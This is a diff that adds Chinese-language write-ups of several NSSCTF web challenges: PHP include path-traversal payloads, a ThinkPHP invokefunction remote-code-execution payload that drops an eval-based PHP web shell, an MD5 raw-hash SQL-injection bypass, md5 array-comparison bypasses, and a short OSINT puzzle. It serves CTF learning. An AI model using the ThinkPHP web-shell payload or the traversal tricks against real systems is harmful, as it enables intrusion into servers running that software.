@@ -60,3 +60,186 @@ if(isset($_GET['p'])){
 ```
 
 通过提示可得知应该使用 `POST` 请求协议，由于 nss 类内函数 ctf 为静态函数，可以直接通过 `nss::ctf` 来调用。通过访问 `/hint2.php` 可以得知类名为 `nss2` ，因此通过构造 payload `p=nss2::ctf` 就可以得到 flag 了。
+
+### ez\_ez\_php
+
+```php
+<?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if ( substr($_GET["file"], 0, 3) === "php" ) {
+        echo "Nice!!!";
+        include($_GET["file"]);
+    } 
+
+    else {
+        echo "Hacker!!";
+    }
+}else {
+    highlight_file(__FILE__);
+}
+//flag.php
+```
+
+Payload 如下
+
+```
+file=php/../flag.php
+```
+
+回显如下
+
+```
+Nice!!!NSSCTF{flag_is_not_here}
+real_flag_is_in_'flag'
+```
+
+最终 Payload 如下
+
+```
+file=php/../flag
+```
+
+### ez\_ez\_php(revenge)
+
+```php
+<?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if ( substr($_GET["file"], 0, 3) === "php" ) {
+        echo "Nice!!!";
+        include($_GET["file"]);
+    } 
+
+    else {
+        echo "Hacker!!";
+    }
+}else {
+    highlight_file(__FILE__);
+}
+//flag.php
+```
+
+Payload 如下
+
+```
+file=php/../../../../../../flag
+```
+
+### ez\_rce
+
+先来一波 Dirsearch
+
+```bash
+$ python dirsearch.py -u http://node1.anna.nssctf.cn:28559/
+[20:22:00] 200 -   35B  - /.gitignore
+[20:30:31] 200 -   18KB - /composer.lock
+[20:30:31] 200 -  942B  - /composer.json
+[20:39:07] 200 -   46B  - /robots.txt
+[20:42:03] 200 -    0B  - /vendor/autoload.php
+[20:42:04] 200 -    0B  - /vendor/composer/autoload_classmap.php
+[20:42:04] 200 -    0B  - /vendor/composer/autoload_files.php
+[20:42:04] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[20:42:04] 200 -    0B  - /vendor/composer/autoload_real.php
+[20:42:04] 200 -    0B  - /vendor/composer/ClassLoader.php
+[20:42:04] 200 -    0B  - /vendor/composer/autoload_static.php
+[20:42:04] 200 -   16KB - /vendor/composer/installed.json
+[20:42:04] 200 -    1KB - /vendor/composer/LICENSE
+[20:42:04] 200 -    0B  - /vendor/composer/autoload_psr4.php
+```
+
+`robots.txt` 内容如下
+
+```
+User-agent: *
+Disallow:
+  -  /NSS/index.php/
+```
+
+访问 `/NSS/index.php` 可以得到提示 `ThinkPHP` 。
+
+<figure><img src=".gitbook/assets/ez_rce-1.png" alt="" width="307"><figcaption></figcaption></figure>
+
+通过 `ThinkPHP-Scan` 扫描一下。
+
+```bash
+$ python thinkphp_scan.py -url http://node1.anna.nssctf.cn:28559/NSS/index.php
+[Info] > thinkphp_invoke_func_code_exec True
+```
+
+构造 Payload 如下以来传入 Shell
+
+```
+s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[1]);?>
+```
+
+通过蚁剑连接
+
+```
+http://node1.anna.nssctf.cn:28559/NSS/shell.php
+```
+
+连接后发现根目录的 `/flag` 是空的，发现 `nss` 文件夹，最后发现 flag 在 `/nss/ctf/flag/flag` 。
+
+### 奇妙的MD5
+
+在 Header 头可以看到 Hint 。
+
+```
+select * from 'admin' where password=md5($pass,true)
+```
+
+可以通过 `ffifdyop` 进行绕过，原因是 `ffifdyop` 经过 md5 加密后变成 `276f722736c95d99e921722cf9ed621c` ，再转换成字符串则变为 `'or'6É]é!r,ùíb` 使得以上 SQL 语句变成了如下样子。
+
+```
+select * from 'admin' where password=''or'6É]é!r,ùíb'
+```
+
+跳转后，得到源代码如下
+
+```html
+<!--
+$x= $GET['x'];
+$y = $_GET['y'];
+if($x != $y && md5($x) == md5($y)){
+    ;
+-->
+```
+
+Payload 如下
+
+```
+x[]=1&y[]=2
+```
+
+可以得到以下代码
+
+```php
+<?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
+    echo $FLAG;
+}
+```
+
+Payload 如下
+
+```
+wqh[]=1&dsy[]=2
+```
+
+就可以得到 flag 了。
+
+### where\_am\_i
+
+问题：什么东西是11位啊？
+
+那就是需要找图上这个地方的电话号码。
+
+http://www1.zmjd100.com/hotel/pc/1283140?checkIn=2023-07-26\&checkOut=2023-07-27
+
+02886112888
